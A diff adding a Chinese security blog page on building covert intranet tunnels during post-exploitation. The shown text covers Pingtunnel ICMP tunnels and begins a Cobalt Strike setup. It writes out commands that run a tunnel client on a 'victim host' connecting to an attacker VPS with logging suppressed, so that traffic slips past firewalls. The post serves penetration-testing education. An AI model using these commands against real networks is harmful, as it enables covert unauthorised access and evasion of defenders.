@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一、前言内网隧道（Intranet tunnel）指的是通过网络隧道的方式，将内网的服务映射到公网上，从而使得外部主机可以访问内网资源。在后渗透阶段，内网隧道的搭建可以帮助攻击者在内部网络中进行更加隐蔽和灵活的操作，从而更好地实现攻击目标。网络隧道还可以更好的帮助我们绕过内网防御、横向渗透、数据转移、隐藏攻击行为，本文简单介绍几种类型的隧道搭建。 二、ICMP隧道ICMP（Internet Con">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络隧道：突破内网的通行证">
+<meta property="og:url" content="http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/index.html">
+<meta property="og:site_name" content="世间闲客·此闲行">
+<meta property="og:description" content="一、前言内网隧道（Intranet tunnel）指的是通过网络隧道的方式，将内网的服务映射到公网上，从而使得外部主机可以访问内网资源。在后渗透阶段，内网隧道的搭建可以帮助攻击者在内部网络中进行更加隐蔽和灵活的操作，从而更好地实现攻击目标。网络隧道还可以更好的帮助我们绕过内网防御、横向渗透、数据转移、隐藏攻击行为，本文简单介绍几种类型的隧道搭建。 二、ICMP隧道ICMP（Internet Con">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230419155830971.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230419160801304.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230419160251896.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430175858624.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430175950882.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430180113881.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430180236000.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430180319548.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230421160516688.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430180515064.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430180805743.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230423100812628.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430180930005.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230423104609449.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230423104802107.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430181009608.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230423105015390.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230423100206006.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230423100458787.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430181535026.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230424093842332.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430181644239.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230424093927718.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430181752847.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430181955810.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430182353337.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430182441235.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430182555251.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230425105649239.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230425105802478.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230425105902471.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430182842692.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430183326994.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430183458656.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430183801644.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430183836873.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430160918692.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430183925696.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430163507584.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430163700295.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430184021047.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426205042250.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426210952158.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426211026202.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426211345157.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426212238887.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426214010225.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426214048954.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426222124373.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426222449818.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426222914800.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230426223551493.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230427211839927.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230427211827875.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230427212257242.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230427212206037.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230427212655830.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230427202212608.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430185530115.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430185640688.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230427203742086.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430185843591.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230427203538104.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430190039259.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430171653727.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430190320771.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230425123300299.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230425123538555.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430191349822.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230425124058682.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430191552717.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502145949254.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502153345821.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502153956115.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502161505106.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502161839332.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502164653706.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502165032679.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502175550215.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502175531322.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502181506434.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230502180938037.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430222233947.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230501121018884.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430200246139.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430222855435.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430201343337.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430223344270.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430230435504.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430230447663.png">
+<meta property="og:image" content="http://example.com/images/tunnel/image-20230430231412509.png">
+<meta property="article:published_time" content="2023-05-07T07:16:48.000Z">
+<meta property="article:modified_time" content="2023-05-08T07:23:58.000Z">
+<meta property="article:author" content="Funsiooo">
+<meta property="article:tag" content="DNS">
+<meta property="article:tag" content="隧道搭建">
+<meta property="article:tag" content="HTTP">
+<meta property="article:tag" content="SOCKS">
+<meta property="article:tag" content="ICMP">
+<meta property="article:tag" content="SSH">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/tunnel/image-20230419155830971.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo-1.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>网络隧道：突破内网的通行证</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/05/22/Python%20Poc%E7%BC%96%E5%86%99%E5%AE%9E%E4%BE%8B%EF%BC%9A%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E8%B7%B5/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/04/04/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E5%B0%8F%E7%B1%B38%20%E7%BA%BF%E5%88%B7%20Pixel%20Experience/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&text=网络隧道：突破内网的通行证"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&is_video=false&description=网络隧道：突破内网的通行证"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网络隧道：突破内网的通行证&body=Check out this article: http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&title=网络隧道：突破内网的通行证"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&name=网络隧道：突破内网的通行证&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/&t=网络隧道：突破内网的通行证"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">2.</span> <span class="toc-text">二、ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">隧道搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pingtunnel%E4%B8%8A%E7%BA%BFCobaltstrike"><span class="toc-number">2.2.1.</span> <span class="toc-text">Pingtunnel上线Cobaltstrike</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pingtunel-%E9%85%8D%E5%90%88-iox-%E4%BB%A3%E7%90%86-socks-%E5%87%BA%E7%BD%91"><span class="toc-number">2.2.2.</span> <span class="toc-text">Pingtunel 配合 iox 代理 socks 出网</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81DNS-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">三、DNS 隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-1"><span class="toc-number">3.1.</span> <span class="toc-text">隧道搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">3.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dnscat2-%E4%B8%8A%E7%BA%BF-Cobastrike"><span class="toc-number">3.2.1.</span> <span class="toc-text">dnscat2 上线 Cobastrike</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSH-%E9%9A%A7%E9%81%93"><span class="toc-number">4.</span> <span class="toc-text">四、SSH 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-2"><span class="toc-number">4.1.</span> <span class="toc-text">隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.1.</span> <span class="toc-text">本地端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.2.</span> <span class="toc-text">远程端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91"><span class="toc-number">4.1.3.</span> <span class="toc-text">动态转发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81Socks-%E9%9A%A7%E9%81%93"><span class="toc-number">5.</span> <span class="toc-text">五、Socks 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-3"><span class="toc-number">5.1.</span> <span class="toc-text">隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-2"><span class="toc-number">5.1.1.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#frp-%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">frp 多级代理</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81HTTP-%E9%9A%A7%E9%81%93"><span class="toc-number">6.</span> <span class="toc-text">六、HTTP 隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA-4"><span class="toc-number">6.1.</span> <span class="toc-text">隧道搭建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%89%A9%E5%B1%95"><span class="toc-number">7.</span> <span class="toc-text">七、扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E7%BD%91%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.1.</span> <span class="toc-text">出网类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.2.</span> <span class="toc-text">代理类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">7.3.</span> <span class="toc-text">连接类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">八、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text">九、参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        网络隧道：突破内网的通行证
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Funsiooo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-07T07:16:48.000Z" itemprop="datePublished">2023-05-07</time>
+        
+        (Updated: <time datetime="2023-05-08T07:23:58.000Z" itemprop="dateModified">2023-05-08</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/DNS/" rel="tag">DNS</a>, <a class="tag-link-link" href="/tags/HTTP/" rel="tag">HTTP</a>, <a class="tag-link-link" href="/tags/ICMP/" rel="tag">ICMP</a>, <a class="tag-link-link" href="/tags/SOCKS/" rel="tag">SOCKS</a>, <a class="tag-link-link" href="/tags/SSH/" rel="tag">SSH</a>, <a class="tag-link-link" href="/tags/%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" rel="tag">隧道搭建</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>内网隧道（Intranet tunnel）指的是通过网络隧道的方式，将内网的服务映射到公网上，从而使得外部主机可以访问内网资源。在后渗透阶段，内网隧道的搭建可以帮助攻击者在内部网络中进行更加隐蔽和灵活的操作，从而更好地实现攻击目标。网络隧道还可以更好的帮助我们绕过内网防御、横向渗透、数据转移、隐藏攻击行为，本文简单介绍几种类型的隧道搭建。</p>
+<h2 id="二、ICMP隧道"><a href="#二、ICMP隧道" class="headerlink" title="二、ICMP隧道"></a>二、ICMP隧道</h2><p>ICMP（Internet Control Message Protocol）Internet 控制报文协议，用于在 IP 主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。ICMP 通过 PING 命令访问远程计算机，建立 ICMP 隧道，将 TCP&#x2F;UDP 数据封装到 ICMP 的 PING 数据包中，从而穿过防火墙，因为防火墙一般不会屏蔽 PING 数据包，实现不受限制的访问。</p>
+<h3 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>ICMP 隧道搭建使用 Pingtunnel，项目地址：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a> ，Pingtunnel 把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp 流量进行转发的工具，跨平台。</p>
+<p>1、服务端（vps）上开启 pingtunnel 服务，我们可以看到在没有客户端连接时，接收到的数据包为 0</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -key [密钥,只限数字]</span><br><span class="line">sudo ./pingtunnel -type server -key 000000</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419155830971.png" data-caption="image-20230419155830971"><img src="/../images/tunnel/image-20230419155830971.png" alt="image-20230419155830971"></a></p>
+<p>2、客户端（受害主机）开启 pingtunenl 服务，连接服务端</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :[转发本机2222端口作为ICMP隧道通讯端口] -s [服务端IP] -[转发类型] 1 -noprint 1 -nolog 1</span><br><span class="line">pingtunnel.exe -type client -l :2222 -s 1.x.x.x -sock5 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419160801304.png" data-caption="image-20230419160801304"><img src="/../images/tunnel/image-20230419160801304.png" alt="image-20230419160801304"></a></p>
+<p>服务端接收到数据，隧道搭建成功</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419160251896.png" data-caption="image-20230419160251896"><img src="/../images/tunnel/image-20230419160251896.png" alt="image-20230419160251896"></a></p>
+<p>将ICMP流量转发为其它协议命令</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ICMP转发为TCP</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455 -tcp 1</span><br><span class="line"></span><br><span class="line"># ICMP转发为UDP</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>ICMP 隧道流量如下</p>
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430175858624.png" data-caption="image-20230430175858624"><img src="/../images/tunnel/image-20230430175858624.png" alt="image-20230430175858624"></a></p>
+<br/>
+
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="Pingtunnel上线Cobaltstrike"><a href="#Pingtunnel上线Cobaltstrike" class="headerlink" title="Pingtunnel上线Cobaltstrike"></a>Pingtunnel上线Cobaltstrike</h4><p>1、按照上面步骤，先利用 Pingtunnel 搭建 ICMP 隧道</p>
+<p>服务端（vps）</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -key 000000(连接密码,只限数字)</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430175950882.png" data-caption="image-20230430175950882"><img src="/../images/tunnel/image-20230430175950882.png" alt="image-20230430175950882"></a></p>
+<p>客户端（受害主机），这边需要将 ICMP 转发为 TCP</p>
